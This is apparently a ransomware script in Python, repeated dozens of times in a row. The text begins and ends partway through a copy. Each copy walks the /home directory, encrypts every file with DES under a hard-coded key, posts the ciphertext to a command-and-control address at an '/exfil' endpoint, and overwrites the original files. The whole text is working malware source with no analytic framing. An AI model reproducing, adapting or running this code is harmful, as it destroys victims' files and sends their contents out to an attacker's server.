            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
